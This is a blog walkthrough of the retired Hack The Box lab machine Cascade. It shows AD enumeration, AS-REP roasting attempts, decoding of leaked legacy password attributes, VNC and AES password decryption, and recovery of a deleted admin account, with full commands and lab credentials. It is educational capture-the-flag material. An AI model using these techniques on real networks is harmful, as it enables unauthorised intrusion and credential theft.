---
layout: post
title: "Cascade: Hack The Box Walkthrough"
date: 2020-07-26 10:39:52 +0000
last_modified_at: 2020-07-26 10:39:52 +0000
category: Walkthrough
tags: ["Hack The Box", Cascade, retired, Windows, Medium]
comments: true
image:
  feature: cascade-htb-walkthrough.png
---

This post documents the complete walkthrough of Cascade, a retired vulnerable [VM][1] created by [VbScrub][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Cascade is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.182 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-03-29 10:16:44 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 636/tcp on 10.10.10.182
Discovered open port 49154/tcp on 10.10.10.182
Discovered open port 3269/tcp on 10.10.10.182
Discovered open port 53/tcp on 10.10.10.182
Discovered open port 389/tcp on 10.10.10.182
Discovered open port 139/tcp on 10.10.10.182
Discovered open port 88/tcp on 10.10.10.182
Discovered open port 49155/tcp on 10.10.10.182
Discovered open port 135/tcp on 10.10.10.182
Discovered open port 49173/tcp on 10.10.10.182
Discovered open port 49158/tcp on 10.10.10.182
Discovered open port 445/tcp on 10.10.10.182
Discovered open port 3268/tcp on 10.10.10.182
Discovered open port 53/udp on 10.10.10.182
Discovered open port 49157/tcp on 10.10.10.182
Discovered open port 5985/tcp on 10.10.10.182
```

The list of open ports resembles that of a Windows machine. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p53,88,135,139,389,445,636,3268,3269,5985,49154,49155,49157,49158,49173 -A --reason 10.10.10.182 -oN nmap.txt
...
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-03-29 10:22:45Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

Looks like we have a Windows Active Directory server. :wink:

### RPC Enumeration

Since RPC is available, let's see what the good ol' `rpcclient` reveals.

```
# rpcclient -U% -c enumdomusers 10.10.10.182
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
```

Cool. We have a list of users. Now, we are going for the low hanging fruit: TGTs for users with the "Do not require Kerberos pre-authentication" set.

```
# for user in $(cat usernames.txt); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.182 "cascade/$user"; done
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for CascGuest
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for arksvc
[-] User arksvc doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for s.smith
[-] User s.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for r.thompson
[-] User r.thompson doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for util
[-] User util doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for j.wakefield
[-] User j.wakefield doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for s.hickson
[-] User s.hickson doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for j.goodhand
[-] User j.goodhand doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for a.turnbull
[-] User a.turnbull doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for e.crowe
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for b.hanson
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for d.burman
[-] User d.burman doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for BackupSvc
[-] User BackupSvc doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for j.allen
[-] User j.allen doesn't have UF_DONT_REQUIRE_PREAUTH set
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Getting TGT for i.croft
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
```

Hmm. No easy path in. Don't worry, let's check the domain password policy.

```
# rpcclient -U% -c getdompwinfo 10.10.10.182
min_password_length: 5
password_properties: 0x00000000
```

OK. Looks like we have a simple password policy. What else can we find?

### Lightweight Directory Access Protocol (LDAP) Enumeration

Truth be told, one can actually use the Lightweight Directory Access Protocol (LDAP) to talk to Active Directory. Let's see what can we glean with `ldapsearch`.

```
# ldapsearch -h 10.10.10.182 -x -b "dc=cascade,dc=local"
...
# Ryan Thompson, Users, UK, cascade.local
dn: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ryan Thompson
sn: Thompson
givenName: Ryan
distinguishedName: CN=Ryan Thompson,OU=Users,OU=UK,DC=cascade,DC=local
instanceType: 4
whenCreated: 20200109193126.0Z
whenChanged: 20200323112031.0Z
displayName: Ryan Thompson
uSNCreated: 24610
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
uSNChanged: 295010
name: Ryan Thompson
objectGUID:: LfpD6qngUkupEy9bFXBBjA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132299650192994271
lastLogoff: 0
lastLogon: 132299662254155455
pwdLastSet: 132230718862636251
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: r.thompson
sAMAccountType: 805306368
userPrincipalName: r.thompson@cascade.local
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local
dSCorePropagationData: 20200126183918.0Z
dSCorePropagationData: 20200119174753.0Z
dSCorePropagationData: 20200119174719.0Z
dSCorePropagationData: 20200119174508.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132294360317419816
msDS-SupportedEncryptionTypes: 0
cascadeLegacyPwd: clk0bjVldmE=
```

Looks like someone is using an old password! The password can be decoded like so.

```
# echo -n clk0bjVldmE= | base64 -d; echo
rY4n5eva
```

Let's see what else can we enumerate now that we have credential (`r.thompson:rY4n5eva`).

### SMB Enumeration

I've heard so many good things about CrackMapExec (CME) but never had the chance to use it. Now is a wonderful opportunity.

{% include image.html image_alt="c97489ee.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/c97489ee.png" %}

We have a share! Time to mount the share and enumerate further to our hearts' content. To mount a SMB share in Linux, we can use the command `mount` like so.

```
# mkdir Data; mount -t cifs -o rw,username=r.thompson,password=rY4n5eva //10.10.10.182/Data ./Data
# ls -laR Data/
Data/:
total 8
drwxr-xr-x 2 root root 4096 Jan 27 03:27 .
drwxr-xr-x 3 root root 4096 Mar 29 16:11 ..
drwxr-xr-x 2 root root    0 Jan 13 01:45 Contractors
drwxr-xr-x 2 root root    0 Jan 13 01:45 Finance
drwxr-xr-x 2 root root    0 Jan 28 18:04 IT
drwxr-xr-x 2 root root    0 Jan 13 01:45 Production
drwxr-xr-x 2 root root    0 Jan 13 01:45 Temps

Data/Contractors:
ls: reading directory 'Data/Contractors': Permission denied
total 0

Data/Finance:
ls: reading directory 'Data/Finance': Permission denied
total 0

Data/IT:
total 4
drwxr-xr-x 2 root root    0 Jan 28 18:04  .
drwxr-xr-x 2 root root 4096 Jan 27 03:27  ..
drwxr-xr-x 2 root root    0 Jan 28 18:00 'Email Archives'
drwxr-xr-x 2 root root    0 Jan 28 18:04  LogonAudit
drwxr-xr-x 2 root root    0 Jan 29 00:53  Logs
drwxr-xr-x 2 root root    0 Jan 28 22:06  Temp

'Data/IT/Email Archives':
total 4
drwxr-xr-x 2 root root    0 Jan 28 18:00 .
drwxr-xr-x 2 root root    0 Jan 28 18:04 ..
-rwxr-xr-x 1 root root 2522 Jan 28 18:00 Meeting_Notes_June_2018.html

Data/IT/LogonAudit:
total 4
drwxr-xr-x 2 root root    0 Jan 28 18:04 .
drwxr-xr-x 2 root root 4096 Jan 28 18:04 ..

Data/IT/Logs:
total 8
drwxr-xr-x 2 root root 4096 Jan 29 00:53  .
drwxr-xr-x 2 root root 4096 Jan 28 18:04  ..
drwxr-xr-x 2 root root    0 Jan 10 16:33 'Ark AD Recycle Bin'
drwxr-xr-x 2 root root    0 Jan 29 00:56  DCs

'Data/IT/Logs/Ark AD Recycle Bin':
total 8
drwxr-xr-x 2 root root    0 Jan 10 16:33 .
drwxr-xr-x 2 root root 4096 Jan 29 00:53 ..
-rwxr-xr-x 1 root root 1303 Jan 29 01:19 ArkAdRecycleBin.log

Data/IT/Logs/DCs:
total 12
drwxr-xr-x 2 root root    0 Jan 29 00:56 .
drwxr-xr-x 2 root root 4096 Jan 29 00:53 ..
-rwxr-xr-x 1 root root 5967 Jan 10 16:17 dcdiag.log

Data/IT/Temp:
total 4
drwxr-xr-x 2 root root    0 Jan 28 22:06 .
drwxr-xr-x 2 root root 4096 Jan 28 18:04 ..
drwxr-xr-x 2 root root    0 Jan 28 22:06 r.thompson
drwxr-xr-x 2 root root    0 Jan 28 20:00 s.smith

Data/IT/Temp/r.thompson:
total 0
drwxr-xr-x 2 root root 0 Jan 28 22:06 .
drwxr-xr-x 2 root root 0 Jan 28 22:06 ..

Data/IT/Temp/s.smith:
total 4
drwxr-xr-x 2 root root    0 Jan 28 20:00  .
drwxr-xr-x 2 root root    0 Jan 28 22:06  ..
-rwxr-xr-x 1 root root 2680 Jan 28 19:27 'VNC Install.reg'

Data/Production:
ls: reading directory 'Data/Production': Permission denied
total 0

Data/Temps:
ls: reading directory 'Data/Temps': Permission denied
total 0
```

I wonder what's in these files?

<div class="filename"><span>Meeting_Notes_June_2018.html</span></div>

{% include image.html image_alt="0ab01004.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/0ab01004.png" %}

<div class="filename"><span>ArkAdRecycleBin.log</span></div>

```
1/10/2018 15:43	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
1/10/2018 15:43	[MAIN_THREAD]	Validating settings...
1/10/2018 15:43	[MAIN_THREAD]	Error: Access is denied
1/10/2018 15:43	[MAIN_THREAD]	Exiting with error code 5
2/10/2018 15:56	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
2/10/2018 15:56	[MAIN_THREAD]	Validating settings...
2/10/2018 15:56	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
2/10/2018 15:56	[MAIN_THREAD]	Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
2/10/2018 15:56	[MAIN_THREAD]	Exiting with error code 0
8/12/2018 12:22	[MAIN_THREAD]	** STARTING - ARK AD RECYCLE BIN MANAGER v1.2.2 **
8/12/2018 12:22	[MAIN_THREAD]	Validating settings...
8/12/2018 12:22	[MAIN_THREAD]	Running as user CASCADE\ArkSvc
8/12/2018 12:22	[MAIN_THREAD]	Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
8/12/2018 12:22	[MAIN_THREAD]	Exiting with error code 0
```

Nothing interesting with `dcdiag.log` so I'll skip it—it's a wall of text. :laughing:

Last but not least.

<div class="filename"><span>VNC Install.reg</span></div>

```
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC]

[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"ExtraPorts"=""
"QueryTimeout"=dword:0000001e
"QueryAcceptOnTimeout"=dword:00000000
"LocalInputPriorityTimeout"=dword:00000003
"LocalInputPriority"=dword:00000000
"BlockRemoteInput"=dword:00000000
"BlockLocalInput"=dword:00000000
"IpAccessControl"=""
"RfbPort"=dword:0000170c
"HttpPort"=dword:000016a8
"DisconnectAction"=dword:00000000
"AcceptRfbConnections"=dword:00000001
"UseVncAuthentication"=dword:00000001
"UseControlAuthentication"=dword:00000000
"RepeatControlAuthentication"=dword:00000000
"LoopbackOnly"=dword:00000000
"AcceptHttpConnections"=dword:00000001
"LogLevel"=dword:00000000
"EnableFileTransfers"=dword:00000001
"RemoveWallpaper"=dword:00000001
"UseD3D"=dword:00000001
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
"DisconnectClients"=dword:00000001
"PollingInterval"=dword:000003e8
"AllowLoopback"=dword:00000000
"VideoRecognitionInterval"=dword:00000bb8
"GrabTransparentWindows"=dword:00000001
"SaveLogToAllUsersPath"=dword:00000000
"RunControlInterface"=dword:00000001
"IdleTimeout"=dword:00000000
"VideoClasses"=""
"VideoRects"=""
```

What have we here. VNC password??!!

### VNC Password Decryption

We can easily reveal the plaintext password with [`vncpwd`](https://github.com/jeroennijhof/vncpwd) even though it's encrypted.

```
# echo -n 6b,cf,2a,4b,6e,5a,ca,0f | tr -d ',' | xxd -p -r > s.smith.vnc && ./vncpwd s.smith.vnc
Password: sT333ve2
```

## Low-Privilege Shell

Armed with `s.smith`'s password, we can use Evil-WinRM to get us a shell. That's because `s.smith` is a member of the **Remote Management Users** group.

{% include image.html image_alt="08864ef7.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/08864ef7.png" %}

Awesome. The file `user.txt` is at `s.smith`'s desktop.

{% include image.html image_alt="edd3d79f.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/edd3d79f.png" %}

## Privilege Escalation

During enumeration of `s.smith`'s account, I notice he can access a hidden share. Recall the LDAP enumeration? There's actually a foreshadowing of the things to come.

{% include image.html image_alt="a9f2b59b.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/a9f2b59b.png" %}

Check this out.

{% include image.html image_alt="93e9355a.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/93e9355a.png" %}

These three files, `Audit.db`, `CascAudit.exe` and `CascCrypto.dll` look interesting. Better copy them to my analysis machine for somes dissection. I'll leave it as an exercise how to transfer the files over. **Hint**: `nc.exe` from Kali Linux.

### SQLite 3 and .NET Disassembly

Turns out that `Audit.db` is a SQLite3 file.

```
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "Ldap" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "uname" TEXT,
        "pwd"   TEXT,
        "domain"        TEXT
);
INSERT INTO Ldap VALUES(1,'ArkSvc','BQO5l5Kj9MdErXx6Q6AGOw==','cascade.local');
CREATE TABLE IF NOT EXISTS "Misc" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Ext1"  TEXT,
        "Ext2"  TEXT
);
CREATE TABLE IF NOT EXISTS "DeletedUserAudit" (
        "Id"    INTEGER PRIMARY KEY AUTOINCREMENT,
        "Username"      TEXT,
        "Name"  TEXT,
        "DistinguishedName"     TEXT
);
INSERT INTO DeletedUserAudit VALUES(6,'test',replace('Test\nDEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d','\n',char(10)),'CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(7,'deleted',replace('deleted guy\nDEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef','\n',char(10)),'CN=deleted guy\0ADEL:8cfe6d14-caba-4ec0-9d3e-28468d12deef,CN=Deleted Objects,DC=cascade,DC=local');
INSERT INTO DeletedUserAudit VALUES(9,'TempAdmin',replace('TempAdmin\nDEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a','\n',char(10)),'CN=TempAdmin\0ADEL:5ea231a1-5bb4-4917-b07a-75a57f4c188a,CN=Deleted Objects,DC=cascade,DC=local');
DELETE FROM sqlite_sequence;
INSERT INTO sqlite_sequence VALUES('Ldap',2);
INSERT INTO sqlite_sequence VALUES('DeletedUserAudit',10);
COMMIT;
```

Looks like `arksvc` uses `CascAudit.exe` to delete users. This appears to corroborate with the `ArkAdRecycleBin.log` seen previously.

Long story short, `CasCrypto.dll` has a `Crypto` class with a `DecryptString` method that decrypts `arksvc`'s password.

{% include image.html image_alt="bf544e91.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/bf544e91.png" %}

{% include image.html image_alt="b2944223.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/b2944223.png" %}

We have all we need to decrypt the password like so.

```
# echo -n BQO5l5Kj9MdErXx6Q6AGOw== | base64 -d | openssl enc -aes-128-cbc -d -nosalt -nopad -K $(echo -n c4scadek3y654321 | iconv -t UTF-8 | xxd -p) -iv $(echo -n 1tdyjCbY1Ix49842 | iconv -t UTF-8 | xxd -p); echo
w3lc0meFr31nd
```

We now have `arksvc`'s credential (`arksvc:w3lc0meFr31nd`). `arksvc` is also a member of the **Remote Management Users** group. Let's login with Evil-WinRM.

{% include image.html image_alt="78dfd86f.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/78dfd86f.png" %}

Sweet.

### Active Directory Recycle Bin

The assumption here is that Active Directory Recycle Bin is enabled for this server and that `TempAdmin` has been deleted and placed in the Active Directory Recycle Bin. We have also previously established the fact that `arksvc` is a member of the **AD Recycle Bin** group and should possess the permissions to query deleted objects.

{% include image.html image_alt="192561ed.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/192561ed.png" %}

We can search for deleted objects with the `Get-ADObject` cmdlet like so.

```
Get-ADObject -Filter 'displayName -eq "TempAdmin"' -SearchBase "CN=Deleted Objects,DC=cascade,DC=local" -IncludeDeleted -Properties * | fl

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : cascade.local/Deleted Objects/TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
CN                              : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
codePage                        : 0
countryCode                     : 0
Created                         : 1/27/2020 3:23:08 AM
createTimeStamp                 : 1/27/2020 3:23:08 AM
Deleted                         : True
Description                     :
DisplayName                     : TempAdmin
DistinguishedName               : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
dSCorePropagationData           : {1/27/2020 3:23:08 AM, 1/1/1601 12:00:00 AM}
givenName                       : TempAdmin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Users,OU=UK,DC=cascade,DC=local
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 1/27/2020 3:24:34 AM
modifyTimeStamp                 : 1/27/2020 3:24:34 AM
msDS-LastKnownRDN               : TempAdmin
Name                            : TempAdmin
                                  DEL:f0cc344d-31e0-4866-bceb-a842791ca059
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 132245689883479503
sAMAccountName                  : TempAdmin
sDRightsEffective               : 0
userAccountControl              : 66048
userPrincipalName               : TempAdmin@cascade.local
uSNChanged                      : 237705
uSNCreated                      : 237695
whenChanged                     : 1/27/2020 3:24:34 AM
whenCreated                     : 1/27/2020 3:23:08 AM
```

Another `cacadeLegacyPwd` attribute??!! Decode it like so.

```
# echo -n YmFDVDNyMWFOMDBkbGVz | base64 -d; echo
baCT3r1aN00dles
```

Recall in the email this is the same password as the `administrator` password? I sense the end is near...

{% include image.html image_alt="3a59842c.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/3a59842c.png" %}

Indeed. Getting `root.txt` is one command away.

{% include image.html image_alt="b0280a51.png" image_src="/ff415060-80fe-4880-94c9-d8a655e01aff/b0280a51.png" %}

:dancer:


[1]: https://www.hackthebox.eu/home/machines/profile/235
[2]: https://www.hackthebox.eu/home/users/profile/158833
[3]: https://www.hackthebox.eu/
